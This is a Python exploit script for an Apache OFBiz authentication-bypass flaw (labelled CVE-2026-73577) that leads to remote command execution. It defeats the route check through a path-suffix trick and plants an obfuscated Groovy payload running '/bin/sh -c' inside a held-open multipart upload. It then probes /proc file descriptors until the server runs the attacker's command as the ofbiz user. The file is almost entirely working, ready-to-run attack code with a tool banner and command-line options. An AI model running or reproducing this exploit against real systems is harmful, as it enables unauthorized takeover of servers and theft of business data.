#!/usr/bin/env python3
"""Apache OFBiz unauthenticated path-suffix view bypass to RCE (CVE-2026-73577).

RequestHandler authorises the first path component of a /control/ request but renders
the view named by the remaining path, so an anonymous request to the public ListLocales
route can render the authenticated showPortalPage view (…/ListLocales/showPortalPage).
That portal reaches a Party widget whose menu location comes from a request parameter
Catalog never sets. This stages a widget menu inside a live multipart upload, points the
parameter at it through the JVM's own descriptor table, and the menu's Groovy runs as the
ofbiz user. Linux target with streaming ingress; fixed in Apache OFBiz 24.09.08.
"""

import argparse
import base64
import concurrent.futures as futures
import html
import os
import re
import secrets
import socket
import ssl
import sys
import threading

import requests

BOOTSTRAP = "/catalog/control/main?visualThemeId=COMMON"
# The protected route is a negative control; the public prefix carries the same view as a suffix.
INTENDED = "/catalog/control/showPortalPage"
CARRIER = "/catalog/control/ListLocales/showPortalPage"
UPLOAD = "/catalog/control/main"
PORTAL_PAGE_ID = "SFA_MAIN"
LOCATION_PARAM = "communicationMenuLocation"
FD_ROOT = "/proc/thread-self/fd"
PAD = 1_200_000

# --- terminal UI ---
_BANNER = r"""
  ___  _____ ____ ___ _____
 / _ \|  ___| __ )_ _|__  /
| | | | |_  |  _ \| |  / /
| |_| |  _| | |_) | | / /_
 \___/|_|   |____/___/____|
"""
_COLOR = sys.stderr.isatty() and os.environ.get("NO_COLOR") is None


def _paint(code, text):
    return f"\033[{code}m{text}\033[0m" if _COLOR else text


def banner(subtitle):
    sys.stderr.write(_paint("36", _BANNER.strip("\n")) + "\n")
    sys.stderr.write("  " + _paint("2", subtitle) + "\n")
    sys.stderr.write("  " + _paint("2", "discovered by CryptoCat · cryptocat.me") + "\n\n")


def info(msg): sys.stderr.write(f" {_paint('36', '[*]')} {msg}\n")
def good(msg): sys.stderr.write(f" {_paint('32', '[+]')} {msg}\n")
def warn(msg): sys.stderr.write(f" {_paint('33', '[!]')} {msg}\n")
def bad(msg): sys.stderr.write(f" {_paint('31', '[-]')} {msg}\n")
def die(msg): bad(msg); sys.exit(1)


def output(data, label):
    good(label)
    sys.stderr.write(_paint("2", "  " + "-" * 60) + "\n")
    sys.stdout.buffer.write(data if data.endswith(b"\n") else data + b"\n")
    sys.stdout.buffer.flush()
# --- end terminal UI ---


def menu_document(marker, command):
    """A widget menu whose item title runs the command and frames its output."""
    # Hex-encoding keeps arbitrary command bytes out of the Groovy and XML quoting layers.
    groovy = (
        "def c=Class.forName('ja'+'va.lang.Pro'+'cessBuilder');"
        f"def z=new String('{command.encode().hex()}'.decodeHex(),'UTF-8');"
        "def a=['/bin/sh','-c',z];"
        "def p=c.getConstructor(Class.forName('ja'+'va.util.List')).newInstance(a);"
        "p.redirectErrorStream(true);def q=p.start();q.outputStream.close();"
        "def o=new ByteArrayOutputStream();q.inputStream.transferTo(o);def e=q.waitFor();"
        f"return '{marker}:'+e.toString()+':'+o.toByteArray().encodeBase64().toString()+':{marker}_END'"
    )
    xml = (f'<?xml version="1.0" encoding="UTF-8"?>\n'
           f'<menus xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"\n'
           f'       xmlns="http://ofbiz.apache.org/Widget-Menu"\n'
           f'       xsi:schemaLocation="http://ofbiz.apache.org/Widget-Menu http://ofbiz.apache.org/dtds/widget-menu.xsd">\n'
           f'  <menu name="CommunicationsMenu">\n'
           f'    <menu-item name="result" title="&#36;{{groovy:{html.escape(groovy, quote=True)}}}">\n'
           f'      <link target="main"/>\n'
           f'    </menu-item>\n  </menu>\n</menus>\n').encode()
    # Cross Commons FileUpload's in-memory threshold so the part is backed by a temporary file.
    return xml + b" " * (PAD - len(xml))


class HeldUpload:
    """POST a multipart body one byte short of its declared length, holding the spool file open."""
    def __init__(self, host, port, verify, menu):
        boundary = "OFBIZ" + secrets.token_hex(12).upper()
        head = (f"--{boundary}\r\n"
                'Content-Disposition: form-data; name="uploadedFile"; filename="menu.xml"\r\n'
                "Content-Type: application/octet-stream\r\n\r\n").encode()
        # No closing boundary: the part stays unterminated so Commons FileUpload keeps the
        # disk-spooled temp file open (readable through /proc/.../fd) during the scan.
        body = head + menu
        self._request = (
            f"POST {UPLOAD} HTTP/1.1\r\nHost: {host}:{port}\r\n"
            f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
            f"Content-Length: {len(body) + 1}\r\nConnection: close\r\n\r\n").encode() + body
        self._host, self._port, self._verify = host, port, verify
        self._release = threading.Event()
        self._thread = threading.Thread(target=self._run, daemon=True)

    def _run(self):
        ctx = ssl.create_default_context()
        if not self._verify:
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
        try:
            self._sock = ctx.wrap_socket(socket.create_connection((self._host, self._port), timeout=30),
                                         server_hostname=self._host)
            self._sock.sendall(self._request)   # everything but the final declared byte
            self._release.wait()
            self._sock.sendall(b" ")            # complete the body so the request ends cleanly
        except OSError:
            pass

    def __enter__(self):
        self._thread.start()
        return self

    def __exit__(self, *exc):
        self._release.set()


def frame(body, marker):
    # HTML-unescape first because the widget renderer may entity-encode the framed command output.
    m = re.search(re.escape(marker) + r":(-?\d+):([A-Za-z0-9+/]*={0,2}):" + re.escape(marker) + "_END",
                  html.unescape(body))
    return (int(m.group(1)), base64.b64decode(m.group(2))) if m else None


def main():
    ap = argparse.ArgumentParser(
        description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="example:\n  %(prog)s https://target:8443 -c id --fd-min 200 --fd-max 600\n")
    ap.add_argument("target", metavar="URL", help="OFBiz HTTPS origin, e.g. https://host:8443")
    ap.add_argument("-c", "--command", default="id", metavar="CMD", help="command to run (default: id)")
    ap.add_argument("--fd-min", type=int, default=200, metavar="N", help="lowest descriptor to probe (default: 200)")
    ap.add_argument("--fd-max", type=int, default=600, metavar="N", help="highest descriptor to probe (default: 600)")
    ap.add_argument("--workers", type=int, default=4, metavar="N", help="concurrent probes (default: 4)")
    ap.add_argument("--verify-tls", action="store_true", help="verify TLS (off by default; OFBiz ships self-signed certs)")
    ap.add_argument("--no-color", action="store_true", help="disable coloured output")
    args = ap.parse_args()
    if args.no_color:
        globals()["_COLOR"] = False

    banner("path-suffix view bypass to RCE  ·  CVE-2026-73577")
    warn("command execution is at-least-once; use an idempotent command")
    base = args.target.rstrip("/")
    host = re.sub(r"^https?://", "", base).split("/")[0]
    hostname, _, port = host.partition(":")
    port = int(port or 443)
    marker = "OFBIZ_" + secrets.token_hex(8).upper()

    session = requests.Session()
    session.verify = args.verify_tls
    if not args.verify_tls:
        requests.packages.urllib3.disable_warnings()

    info(f"Bootstrapping an anonymous Catalog session through {BOOTSTRAP}")
    boot = session.get(base + BOOTSTRAP, timeout=15, allow_redirects=False)
    info(f"Bootstrap response: HTTP {boot.status_code}")
    if session.cookies:
        good("Anonymous session cookie obtained")
    headers = {"X-Requested-With": "XMLHttpRequest"}
    m = re.search(r'name=["\']csrf-token["\'][^>]*content=["\']([^"\']+)', boot.text, re.I)
    if m:
        good(f"Anonymous AJAX CSRF token obtained ({len(m.group(1))} characters)")
        headers["X-CSRF-Token"] = m.group(1)

    # Confirm the view cannot be reached through its intended authenticated route.
    direct = session.post(base + INTENDED, data={"portalPageId": PORTAL_PAGE_ID},
                          headers=headers, timeout=15, allow_redirects=False)
    info(f"Intended {INTENDED} route: HTTP {direct.status_code}")
    if direct.status_code != 401:
        warn("expected HTTP 401 from the intended authenticated route")

    info(f"Staging {PAD:,}-byte menu through {UPLOAD}")
    # Keep the multipart request open while worker threads probe the server's live descriptor table.
    with HeldUpload(hostname, port, args.verify_tls, menu_document(marker, args.command)):
        threading.Event().wait(2.0)  # let the file part spill to disk

        def probe(fd):
            # The fragment makes each location distinct to caches but is ignored when opening the file.
            loc = f"file:{FD_ROOT}/{fd}#{marker}_{fd}"
            r = session.post(base + CARRIER, data={"portalPageId": PORTAL_PAGE_ID, LOCATION_PARAM: loc},
                             headers=headers, timeout=15, allow_redirects=False)
            hit = frame(r.text, marker)
            return (fd, r.status_code, hit) if hit else None

        with futures.ThreadPoolExecutor(max_workers=args.workers) as pool:
            for res in pool.map(probe, range(args.fd_max, args.fd_min - 1, -1)):
                if res:
                    fd, status, (exit_status, out) = res
                    good(f"Path-suffix portal chain loaded the staged menu through {FD_ROOT}/{fd}")
                    good(f"Carrier response was HTTP {status} and the intended route was protected")
                    good(f"Remote command exit status: {exit_status}")
                    output(out, "command output")
                    return
    die("no staged menu descriptor was found in the requested range")


if __name__ == "__main__":
    try:
        main()
    except requests.RequestException as e:
        die(f"request failed: {e}")
    except KeyboardInterrupt:
        sys.exit(130)
